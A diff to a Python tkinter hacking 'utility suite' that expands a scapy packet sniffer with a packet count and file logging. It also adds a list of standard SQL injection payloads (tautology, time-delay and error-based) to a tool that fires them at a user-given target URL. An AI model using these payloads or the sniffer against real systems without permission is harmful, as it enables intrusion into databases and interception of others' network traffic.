@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext
+from tkinter import ttk, messagebox, scrolledtext, filedialog
 import socket
 import requests
 from scapy.all import *
@@ -121,13 +121,32 @@ def create_network_sniffer_tool(tool_frame):
     tool_label = ttk.Label(tool_frame, text="Network Sniffer", font=("Helvetica", 16))
     tool_label.pack(pady=10)
 
+    packets_label = ttk.Label(tool_frame, text="Number of Packets to Sniff:")
+    packets_label.pack()
+    packets_entry = ttk.Entry(tool_frame)
+    packets_entry.pack()
+
+    save_checkbox_var = tk.IntVar()
+    save_checkbox = ttk.Checkbutton(tool_frame, text="Save to File", variable=save_checkbox_var)
+    save_checkbox.pack()
+
     output_text = scrolledtext.ScrolledText(tool_frame, wrap=tk.WORD, width=80, height=20)
     output_text.pack(padx=10, pady=10)
 
     sniff_button = ttk.Button(tool_frame, text="Start Sniffing",
-                              command=lambda: network_sniffer(output_text))
+                              command=lambda: network_sniffer(output_text, int(packets_entry.get()), save_checkbox_var.get()))
     sniff_button.pack()
 
+
+# List of SQL injection payloads for testing purposes
+sql_injection_payloads = [
+    "' OR '1'='1'; -- ",
+    "' OR 1=1; -- ",
+    "' OR 'a'='a",
+    "') OR ('a'='a",
+    "'; WAITFOR DELAY '0:0:5' --",
+    "' AND 1=CONVERT(INT, (SELECT @@version)); --",
+]
 
 def create_sql_injection_tool(tool_frame):
     tool_label = ttk.Label(tool_frame, text="SQL Injection Tool", font=("Helvetica", 16))
@@ -135,21 +154,21 @@ def create_sql_injection_tool(tool_frame):
 
     target_label = ttk.Label(tool_frame, text="Target URL:")
     target_label.pack()
-    target_entry = ttk.Entry(tool_frame)
+    target_entry = ttk.Entry(tool_frame, width=50)
     target_entry.pack()
 
     payload_label = ttk.Label(tool_frame, text="SQL Payload:")
     payload_label.pack()
-    payload_entry = ttk.Entry(tool_frame)
-    payload_entry.pack()
+    payload_combo = ttk.Combobox(tool_frame, values=sql_injection_payloads, width=50)
+    payload_combo.pack()
 
     result_label = ttk.Label(tool_frame, text="Result:")
     result_label.pack()
-    result_text = scrolledtext.ScrolledText(tool_frame, wrap=tk.WORD, width=40, height=10)
+    result_text = scrolledtext.ScrolledText(tool_frame, wrap=tk.WORD, width=60, height=10)
     result_text.pack(padx=10, pady=10)
 
     scan_button = ttk.Button(tool_frame, text="Execute SQL Injection",
-                             command=lambda: execute_sql_injection(target_entry.get(), payload_entry.get(), result_text))
+                             command=lambda: execute_sql_injection(target_entry.get(), payload_combo.get(), result_text))
     scan_button.pack()
 
 
@@ -206,18 +225,28 @@ def start_password_cracking(target_password, dictionary_file, output_text):
     pass
 
 
-def network_sniffer(output_text):
+def network_sniffer(output_text, packets_to_sniff, save_to_file):
     try:
         output_text.delete(1.0, tk.END)  # Clear any previous output
 
         # Define a packet capture function
         def packet_capture(packet):
+            nonlocal packets_to_sniff
+            if packets_to_sniff <= 0:
+                return
+
             # Analyze and display packet information
             packet_info = f"Packet: {packet.summary()}\n"
             output_text.insert(tk.END, packet_info)
 
+            if save_to_file:
+                with open("sniffer_output.txt", "a") as file:
+                    file.write(packet_info)
+
+            packets_to_sniff -= 1
+
         # Start sniffing on the default network interface
-        sniff(prn=packet_capture, filter="ip", count=10)  # Change the filter and count as needed
+        sniff(prn=packet_capture, filter="ip", count=packets_to_sniff)  # Change the filter and count as needed
 
     except Exception as e:
         output_text.insert(tk.END, f"An error occurred: {str(e)}\n")
@@ -273,7 +302,8 @@ access_button.pack()
 info_label = ttk.Label(access_frame, text="This is a versatile utility suite. Please enter the access code to access the tools.")
 info_label.pack(pady=10)
 
-info_label = ttk.Label(access_frame, text="Created By IndulgeIn.", font=("Sans-serif", 7))
+info_label = ttk.Label(access_frame, text="Created By IndulgeIn."
+                                          "Version Version 0.223- Zenklaeta", font=("Sans-serif", 7))
 info_label.pack()
 
 app.mainloop()
